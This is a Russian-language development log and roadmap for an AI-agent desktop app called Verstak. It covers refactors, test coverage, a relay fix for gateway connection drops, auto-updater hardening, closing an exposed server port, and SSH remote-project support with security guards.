- **finding 2+3 (§5 PerChatState bundle):** `checkpointId`/`preflights`/`subagentRuns` внесены в `ChatStateBundle` (типы PreflightCard/SubagentRunCard перенесены в store-agnostic `session-snapshot.ts` + re-export для Chat.tsx) → **сохраняются per-chat** при переключении чата/проекта/выхода из справки, чужие НЕ утекают (каждый чат восстанавливает свой). f2: кнопка отката больше не пропадает при переключении чатов. f3: карточки активности не залипают (preserve вместо reset — лучше для фоновых чатов). switchChatSession/setProject/leaveHelpMode/openHelpChat сведены на captureBundle/restoreBundle (убрана 4-я рукописная копия литерала). Локирующие тесты переписаны под preserve-семантику + roundtrip. **type ✓, store 54 зелёных.**
- **finding 1 (durability):** undo `floors` теперь **персистятся в SQLite** (миграция 28 `undo_floors`) + гидратация при старте `createUndoStack` → переживают краш (раньше in-memory терялись, prune съедал пост-чекпоинт записи). +3 sqlite-теста (durability/restart/дубликат floor). **type ✓, полный набор 1424 зелёных (sqlite на реальной БД).**

## ✅ Сделано (21.06)

- **Тех-долг §5 — распил `projectStore` (1308 → 905 строк, −403/−31%).** Пять behavior-preserving шагов под type+тесты: (1) ядро роутинга стрим-событий `applySnapshotEvent` (3× near-duplicate → 1 модуль, +13 тестов); (2) операции над сообщениями `lib/chat-messages` (дедуп 5+ мест, +10); (3+4) **структурный распил на zustand-слайсы** `pipeline-slice` + `review-slice` (8 review-методов + ReviewState + 4 pipeline-метода вынесены, ProjectState = Main & PipelineSlice & ReviewSlice). Перед структурным распилом — **состязательный архитектурный ревью плана** (4 агента + verify): вердикт GO, все «high» приземлены (цикл импортов → type-only `interface`; задвоение/токены → дисциплина исполнения, не дефект). Чеклист ревью соблюдён: `StateCreator<ProjectState>` над полным типом, `import type` обратное ребро, спред справа, тела Main не тронуты, страж partial-merge (cleanupReviewsFor не обнуляет main). **+24 теста, вся суита 1354 зелёных, type ✓.** Коммиты 9be3905/3ef960f/5f51d4c/17f0e4f. ⚠️ Renderer-изменения — нужен разовый клик-тест сборки (Pipeline-баннер + 🔍 Review) как финальная страховка.

## ✅ Сделано (20.06)

- **Мердж автообновления Ильи + адверсариальный ревью + харднинг (→ войдёт в 1.5.23).** Влил `filatov/main` (модульный рефактор апдейтера `electron/autoupdate/`), решил конфликты (версия/changelog). Перед выкаткой всем прогнал ревью flow установки (9 агентов) — поймал реальный HIGH: новый flow требует системный `node.exe` для распаковки/установки (у dev-юзеров Павел/Илья есть → сработает; у будущих не-dev нет). Остальное проверка приземлила (залипание installing само-восстанавливается; robocopy-откат не регрессия; «.cmd node» ложное). Точечные безопасные фиксы (e7441cf): фильтр node.exe, busy-guard (нет ложного тоста ошибки), идемпотентность install, восстановление из застрявшего installing, понятное сообщение node-missing. +3 теста, 1330 зелёных. **ХВОСТ ИЛЬЕ** (его зона, нужен E2E на чистой машине без Node): настоящий zero-Node автоапдейт — бандл `node.exe` в extraResources ИЛИ PS-rewrite helper'а; + medium-харднинг robocopy-откат/silent-installer fallback.
- **Аудит надёжности релея (12 агентов, живой сервер) + закрытие находок.** После релея прогнал состязательный аудит «будет ли у юзеров чётко». Подтверждено ОК: стриминг/cost-pill/корректность, релей не open-proxy, авторизация не байпасится, серт до сентября + автопродление. **Найдена и закрыта реальная дыра (не Verstak):** на сервере релея CRM-порт AI-BOS `8765` торчал в интернет без firewall — анонимный дамп задач+карточек клиентов с PII. Закрыл `iptables`-правилом (DROP снаружи, loopback/nginx целы), персист на ребут, проверено снаружи (таймаут), `ai-bos.ru` и релей не затронуты. **Код Verstak (фолбэк + override):** verstak-gateway получил `fallbackBaseUrl` (прямой Амстердам) — при сетевом падении релея openai-compat авто-ретраит тем же ключом на прямой хост (только сетевой сбой, не HTTP-ошибки, не отмена); плюс override релея через настройку `verstak_gateway_baseurl` (kill-switch без релиза). +5 тестов (gateway-fallback), type ✓, ai+lib 703 зелёных. **Укрепление релея (сделано):** swap 2ГБ + nginx Restart=on-failure. **Постоянный домен (сделано):** добавил A-запись `api-ru.agi-iri.ru→194.87.187.234` в reg.ru (форма открылась со 2-го клика по типу), расширил серт на него, переключил Verstak baseUrl с IP-хоста sslip.io на `https://api-ru.agi-iri.ru/v1` — смена сервера теперь через DNS без релиза. **Остаток DEBT:** uptime-алёрт релея (нужен канал — UptimeRobot/TG); 9000-вебхук закрыть снаружи+сменить секрет (зона AI-BOS); пулы ключей `IRI_KEYS_*` на шлюзе (для масштаба).
- **🔴→🟢 Надёжность Verstak Gateway РЕШЕНА (корень + фикс, проверено вживую).** Симптом: агентные запросы из Verstak к `api.agi-iri.ru` (Амстердам) рвались «Connection error» на ~1 минуте. Диагноз (через /dev-hq + Workflow): gateway/nginx здоровы, серверный curl и S2S Москва→Амстердам тянут 100КБ за 0.3с — рвёт **РФ last-mile → NL на крупных телах** (16k токенов агентного контекста ≈ 100КБ), нестабильно (undici 408/drop, curl иногда проходит). Фикс — **РФ-релей**: nginx-reverse-proxy на сервере в Москве (`194.87.187.234`) терминирует юзера коротким стабильным хопом и форвардит S2S в Амстердам. Хост — magic-DNS `194-87-187-234.sslip.io` (reg.ru SPA не дал добавить запись под автоматизацией — обошли без reg.ru), LetsEncrypt-серт через HTTP-01. Verstak Gateway baseUrl → релей. **Проверено: 100КБ с ПК через релей 5/5 за <1.5с; живой запрос из приложения Verstak → 200 «Токио» за 2с** (в логе релея `OpenAI/JS` 200). Серверная часть (gateway): async-блокировка event-loop починена (run_in_threadpool+timeout), `#5` cost-pill meta-чанк сделан well-formed, пресеты `verstak/*` разведены на разные апстримы+fallback. **Остаток (DEBT, не блокирует):** sslip.io — бридж; постоянный поддомен `api-ru.agi-iri.ru` добавить когда Павел за компом; релей хардкодом в коде — позже вынести в настройку.
- **Распил `tool-handlers.ts`** (монолит 3156 → 120 строк, 15 модулей в `electron/ipc/tool-handlers/`): чистый рефакторинг, поведение байт-в-байт, `HANDLER_REGISTRY` единый диспетчер, публичный API/реэкспорты сохранены. type ✓ · 1253 теста ✓. Открыл тестируемость хендлеров (§5.3).
- **Verstak Gateway** как провайдер — первым в списке + инструкция подключения, ключи `vsk_live_` (legacy `sk-iri-` принимаются). Бэкенд `api.agi-iri.ru` живой.
- **Chat handoff** — сохранение диалога в Downloads (a22d028).
- **→ Релиз `1.5.22`** (всё выше + бренд Gateway).
- **Покрытие хендлеров (§5.3, после распила)** — +27 тестов на критичные рубежи: ядро DoD `attest_verification` (статус по exitCode, сверка claimed-vs-actual, 8), гейтинг записи `diffConfirmWrite` (block/auto/confirm, 6), гейтинг команд `run_command` + редакция секретов (6), `connector_query` + guard Я.Диск (7). Все side-effect-поверхности гейтятся протестированно.
- **Checkpoint-resume агентного цикла, Фаза 2 (§5.4 резилентность)** — прерванная крахом сессия возобновляется с НАКОПЛЕННЫМ контекстом, а не с turn 0. Миграция 26 (`agent_run_checkpoints`, один снапшот/прогон) + facade save/latest/clear; per-turn снапшот `currentMessages` рядом с tick, очистка на completed; `ai:send` грузит чекпойнт по `resumeFromRunId` и подаёт историю минуя пере-сборку system; `parseResumeCheckpoint` (строгая валидация → мягкий фоллбэк). Цепочка ResumeBanner→Chat→ai:send замкнута. **+20 тестов (storage 7, loop save/clear, parse 6). Backend под ключ; UI-glue resume — на живую проверку. Тестов: 1303.**

## ✅ Сделано (марафон 17–19.06)

- **Багфиксы:** 3 bug-hunt'а + 4-й по провайдерам — 28+ багов закрыто и запушено.
- **Тех-долг §5:** agent-loop тест-харнес · projectStore дедупликация (3 фазы) · CLI parity · покрытие критичных путей.
- **Pipeline Brief→Proof** (флагман, спек D1→D10): storage(миграция 22)+IPC+store+UI, 33 теста → **1.5.16**.
- **Merge Ильи:** дизайн (таймер ответа, markdown) + фикс установщика «9% install error / не скачивалась» → **1.5.17**.
- **Релизы:** 1.5.13 → 1.5.17, все проверены на скачиваемость.
- **Diagnostic Loop v2** (бэклог): авто-tsc после правок .ts/.tsx → ошибки в контекст агента (коммит 60edc11, в main, не зарелизено).
- **RU Workflow Pack** (бэклог): добавлен Ozon+WB снимок — итого 5 RU-сценариев (цель ≥3 перевыполнена; доки 1.5.3 устарели). Коммит 349283e.
- **Сортировка FilesView** (хвост): папки→файлы (sortFileTree). Коммит ce40ab7.
- **Skill Capture** (бэклог): кнопка «⭐ В скилл» в AgentRunsPanel → скаффолд в ~/.verstak/skills/. Коммит 636d276 (UI-клик — 1 живая проверка).

---

## 🚧 Удалённые проекты (SSH/Git) — в работе

Две модели: git-клон (A, как сейчас + push) + SSH-live (B, правки прямо на сервере, для agi-iri.ru). План #4 в Verstak.

- ✅ Фаза 0: парсер источника (0fec892) · ssh-fs примитивы (0abcd08)
- ✅ Фаза 1: storage-модель `project.kind/remote` миграция 23 (f4f67da)
- ✅ A: git-клон + add-remote IPC (546f4d7) — `addRemote(url)` клонирует репо; **A функционально готов** (нужен UI-вход)
- ✅ **B: роутинг tool-слоя на ssh** (4dd3587) — read/write/run/list/search идут на сервер для ssh-проектов; escape-guard + ssh-denylist + confirm. Локальные не затронуты. **Юнит-тесты вкл. security; реальный ssh-exec — нужна живая проверка на безопасном пути перед прод-сайтом.**
- ⬜ B: undo удалённых файлов (локальный undo не правит ssh-файлы) · degraded для ssh: project-map/user-layer читают локальную ФС (полиш)
- ⬜ UI: «Добавить проект» → выбор источника (папка/GitHub/SSH) — Илья + лайв-тест ssh

## 🔀 Гибридный оркестратор API↔CLI — в работе

Концепт: бесшовное переключение API↔CLI в одном чате. Сверка показала — **~75% уже было** (единый лог, `buildCliPrompt`, context-pack, ручное переключение, delegate_task смешивает API+CLI). Дизайн-док: `docs/hybrid-orchestrator.md`.

- ✅ **Фаза 1**: `detectCliWorthiness` в smart-router (детектор терминальных задач) + honest info-подсказка при API-провайдере. 7 тестов. Решение: подсказка, НЕ молчаливый свитч (контроль/прозрачность).
- ⬜ Фаза 2: UI-pill «Терминальная задача → Claude Code?» в один клик (Илья + живая проверка Сценария А end-to-end).
- ✅ **Фаза 3 (транспорт)**: delegate→CLI проверен и зафиксирован тестами — `buildSubCreateOptions` строит опции claude-cli (oauth+cwd), `claude-cli.send` сериализует через `buildCliPrompt`, `runSubAgentLoop` корректно ловит CLI-стиль (текст без tool-call → completed), usage учитывается в cost-guard. 3 регресс-теста `sub-agent-cli-delegate`. Остался только **живой прогон CLI-бинаря** (нужен сконфигурированный Claude Code).
- 🟡 Честность DoD: CLI обходит denylist Verstak (свой sandbox) — задокументировано, не обещаем обратное.

## 📋 Бэклог (стратегический — на отдельные сессии, по приоритету)

Источник: `verstak-donors-product-strategy` + `verstak_v5_review_and_ideas` (в Downloads).

| Приоритет | Задача | Эффект | Размер |
|-----------|--------|--------|--------|
| ✅ | ~~Diagnostic Loop v2~~ — СДЕЛАНО (60edc11) | — | — |
| ✅ | ~~RU Workflow Pack~~ — СДЕЛАНО (5 сценариев, 349283e) | — | — |
| ✅ | ~~Skill Capture~~ — СДЕЛАНО (636d276) | — | — |
| 🔴 нужна живая проверка | **Agent Registry UI** — инфра УЖЕ есть (AgentsPanel/MultiAgentPicker/role-tools); нужна UX-полировка + клик | multi-agent без хаоса | M |
| 🔴 нужна живая проверка | **Pipeline v1.1** — Agency-режим (через WorkflowsPanel + баннер) | hero для агентств | M |
| 🟠 Electron-coupled | **Proof Pack → PDF + Telegram** — printToPDF (нужен Electron) + отправка | B2B / agency sales | M |
| 🟠 большая инфра | **Remote Pulse** — TG-бот: статус run, approve write, доставка Proof Pack | контроль с телефона | L |
| ✅ | ~~DoD Commit Guard + mandatory DoD setting~~ — СДЕЛАНО и покрыто (dev-task `devtask:commit`, `dod_mode` warn/block/off + override + audit; F2-тесты) | надёжность | — |
| — | Heatmap файлов в FilesView · deep-interview (Gajae) | разное (UI → живая проверка) | S–L |

---

## 🚫 Решено НЕ делать (чтобы не возвращаться)

- Локальный RAG (ONNX в Electron), Docker-песочница, Swarm-дашборд — тяжело, не первыми (из 10 идей ревью).
- Полная миграция компонентов projectStore на map-селекторы — churn без багофикса (ценность §5#1 уже взята дедупом).
- «Русский Cursor» как позиционирование — размывает (controlled workspace + proof + RU ops).

---

*Правило ведения: после каждого закрытого блока — двигаю строку из «Открытые хвосты»/«Бэклог» в «Сделано», обновляю дату/версию сверху. Источники истины по фактам — память (`MEMORY.md`).*
